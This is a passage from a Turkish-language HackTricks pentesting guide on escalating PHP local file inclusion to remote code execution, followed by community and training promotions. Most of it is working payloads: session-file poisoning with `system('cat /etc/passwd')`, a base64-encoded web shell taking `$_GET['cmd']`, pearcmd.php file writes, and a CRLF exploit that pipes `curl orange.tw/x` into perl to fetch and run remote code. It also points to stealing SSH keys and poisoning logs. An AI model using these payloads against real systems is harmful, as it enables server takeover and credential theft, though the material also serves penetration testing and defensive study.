### Zip dosyası yükleme yoluyla

Sıkıştırılmış bir PHP shell içeren bir ZIP dosyası yükleyin ve erişin:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP oturumları

Web sitesinin PHP Oturumu (PHPSESSID) kullanıp kullanmadığını kontrol edin
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP'de bu oturumlar _/var/lib/php5/sess\\_\[PHPSESSID]\_ dosyalarında saklanır.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Set the cookie to `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI'yi PHP oturum dosyasını dahil etmek için kullanın
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Eğer ssh aktifse, hangi kullanıcının kullanıldığını kontrol edin (/proc/self/status & /etc/passwd) ve **\<HOME>/.ssh/id\_rsa**'ya erişmeye çalışın.

### **Via** **vsftpd** _**logs**_

FTP sunucusu vsftpd için loglar _**/var/log/vsftpd.log**_ konumundadır. Bir Yerel Dosya Dahil Etme (LFI) açığı mevcutsa ve ifşa edilmiş bir vsftpd sunucusuna erişim mümkünse, aşağıdaki adımlar dikkate alınabilir:

1. Giriş sürecinde kullanıcı adı alanına bir PHP yükü enjekte edin.
2. Enjeksiyondan sonra, LFI'yi kullanarak sunucu loglarını _**/var/log/vsftpd.log**_ konumundan alın.

### Via php base64 filter (using base64)

[Bu](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) makalede gösterildiği gibi, PHP base64 filtresi sadece Non-base64'ü yok sayar. Bunu dosya uzantısı kontrolünü atlamak için kullanabilirsiniz: eğer ".php" ile biten base64 sağlarsanız, "."'yu yok sayar ve base64'e "php" ekler. İşte bir örnek yük:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (no file needed)

Bu [**yazı**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d), **php filtrelerini kullanarak rastgele içerik** oluşturabileceğinizi açıklar. Bu, temelde **bir dosyaya yazmadan** dahil etmek için **rastgele php kodu** oluşturabileceğiniz anlamına gelir.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Via segmentation fault

**Geçici** olarak `/tmp` dizinine kaydedilecek bir dosya **yükleyin**, ardından **aynı istekte** bir **segmentation fault** tetikleyin, ve ardından **geçici dosya silinmeyecek** ve onu arayabilirsiniz.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Via Nginx temp file storage

Eğer bir **Local File Inclusion** bulduysanız ve **Nginx** PHP'nin önünde çalışıyorsa, aşağıdaki teknikle RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Via PHP\_SESSION\_UPLOAD\_PROGRESS

Eğer bir **Local File Inclusion** bulduysanız, **oturumunuz olmasa bile** ve `session.auto_start` `Kapalı` ise. **`PHP_SESSION_UPLOAD_PROGRESS`**'i **multipart POST** verilerinde sağlarsanız, PHP sizin için **oturumu etkinleştirecektir**. Bunu RCE elde etmek için kötüye kullanabilirsiniz:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php_session_upload_progress.md)
{% endcontent-ref %}

### Via temp file uploads in Windows

Eğer bir **Local File Inclusion** bulduysanız ve sunucu **Windows** üzerinde çalışıyorsa RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Via `pearcmd.php` + URL args

Bu [**yazıda açıklandığı gibi**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), `/usr/local/lib/phppearcmd.php` dosyası php docker görüntülerinde varsayılan olarak mevcuttur. Ayrıca, bir URL parametresi `=` içermiyorsa, bunun bir argüman olarak kullanılacağı belirtilmiştir.

Aşağıdaki istek, `/tmp/hello.php` dizininde `<?=phpinfo()?>` içeriği ile bir dosya oluşturur:

{% code overflow="wrap" %}
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
{% endcode %}

Aşağıdaki, RCE elde etmek için bir CRLF açığını istismar eder ( [**buradan**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() Üzerinden (file\_uploads = on)

Eğer bir **Local File Inclusion** bulduysanız ve **file\_uploads = on** olan bir dosya **phpinfo()** sunuyorsa, RCE elde edebilirsiniz:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Yol Açıklaması Üzerinden

Eğer bir **Local File Inclusion** bulduysanız ve **geçici dosyanın yolunu dışarıya aktarabiliyorsanız** AMA **sunucu** **dahil edilecek dosyanın PHP işaretlerine sahip olup olmadığını kontrol ediyorsa**, bu **Race Condition** ile **o kontrolü atlamayı** deneyebilirsiniz:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Sonsuz Bekleme + Brute Force Üzerinden

Eğer LFI'yi **geçici dosyalar yüklemek** için kötüye kullanabiliyorsanız ve sunucunun PHP yürütmesini **dondurmasını** sağlayabiliyorsanız, o zaman **geçici dosyayı bulmak için saatlerce dosya adlarını brute force** yapabilirsiniz:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Fatal Error'a

Eğer `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` dosyalarından herhangi birini dahil ederseniz. (Bu hatayı atmak için aynı dosyayı 2 kez dahil etmeniz gerekir).

**Bunun nasıl faydalı olduğunu bilmiyorum ama belki de faydalıdır.**\
&#xNAN;_&#x45;PHP Fatal Error'a neden olsanız bile, yüklenen PHP geçici dosyaları silinir._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Referanslar

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında güncel kalın

**Son Duyurular**\
Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
